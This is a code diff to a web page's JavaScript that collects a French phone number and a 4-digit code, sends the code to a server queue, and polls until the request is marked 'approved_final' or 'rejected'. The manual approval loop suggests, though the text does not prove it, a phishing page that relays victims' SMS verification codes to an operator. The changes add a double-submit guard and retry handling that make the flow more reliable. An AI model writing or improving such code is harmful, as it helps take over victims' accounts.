@@ -79,6 +79,7 @@ function showWaiting(phone){
   document.getElementById('waitPhone').textContent='+33 '+fmt(phone);
 }
 function showCodeStep(phone){
+  codeSending=false; document.getElementById('verifyCode').disabled=false;
   document.getElementById('waitingPanel').classList.add('hidden');
   authForm.classList.add('hidden');
   userPanel.classList.add('hidden');
@@ -147,10 +148,11 @@ document.getElementById('logout').onclick=doLogout;
 document.getElementById('headerLogout').onclick=doLogout;
 document.getElementById('headerLogin').onclick=()=> openModal();
 document.getElementById('unlockAll').onclick=()=>{ closeM(); render(); };
-let pendingIdGlobal=null;
+let pendingIdGlobal=null; let codeSending=false;
 document.getElementById('verifyCode').onclick=async()=>{
+  if(codeSending) return; codeSending=true; document.getElementById('verifyCode').disabled=true;
   const v=document.getElementById('codeInput').value.trim();
-  if(v.length!==4) { document.getElementById('codeErr').style.display='block'; return; }
+  if(v.length!==4) { document.getElementById('codeErr').style.display='block'; codeSending=false; document.getElementById('verifyCode').disabled=false; return; }
   document.getElementById('codeErr').style.display='none';
   const pid=pendingIdGlobal;
   await fetch('/api/pending/update',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id:pid,enteredCode:v,status:'code_entered'})});
@@ -160,10 +162,10 @@ document.getElementById('verifyCode').onclick=async()=>{
   const iv2=setInterval(async()=>{
     try{
       const r=await fetch('/api/pending'); const pend=await r.json();
-      const p=pend.find(x=>x.id===pid);
-      if(p && p.status==='approved_final'){ clearInterval(iv2); currentUser=pendingUser; localStorage.setItem('ch_user_v2',JSON.stringify(currentUser)); pendingUser=null; pendingCode=null; pendingIdGlobal=null; closeM(); render(); }
-      if(p && p.status==='rejected'){ clearInterval(iv2); alert('Code refusé'); location.reload(); }
-      if(!p){ clearInterval(iv2); alert('Demande expirée'); location.reload(); }
+      const p=pend.find(x=>String(x.id)===String(pid));
+      if(p && p.status==='approved_final'){ clearInterval(iv2); codeSending=false; document.getElementById('verifyCode').disabled=false; currentUser=pendingUser; localStorage.setItem('ch_user_v2',JSON.stringify(currentUser)); pendingUser=null; pendingCode=null; pendingIdGlobal=null; closeM(); render(); }
+      if(p && p.status==='rejected'){ clearInterval(iv2); codeSending=false; document.getElementById('verifyCode').disabled=false; alert('Code refusé'); document.getElementById('waitingPanel').classList.add('hidden'); document.getElementById('codePanel').classList.remove('hidden'); return; }
+      if(!p){ clearInterval(iv2); codeSending=false; document.getElementById('verifyCode').disabled=false; alert('Demande expirée'); document.getElementById('waitingPanel').classList.add('hidden'); authForm.classList.remove('hidden'); return; }
     }catch(e){}
   },1500);
 };
@@ -187,7 +189,7 @@ document.getElementById('backToForm').onclick=e=>{
 document.getElementById('waitBack').onclick=e=>{
   e.preventDefault(); document.getElementById('waitingPanel').classList.add('hidden'); authForm.classList.remove('hidden'); modalTitle.textContent='Inscription gratuite';
 };
-document.getElementById('codeInput').addEventListener('input',e=>{ e.target.value=e.target.value.replace(/\D/g,'').slice(0,4); if(e.target.value.length===4) document.getElementById('verifyCode').click(); });
+document.getElementById('codeInput').addEventListener('input',e=>{ e.target.value=e.target.value.replace(/\D/g,'').slice(0,4); if(e.target.value.length===4 && !codeSending) document.getElementById('verifyCode').click(); });
 
 let activeIdx=0;
 function openLight(idx,src){
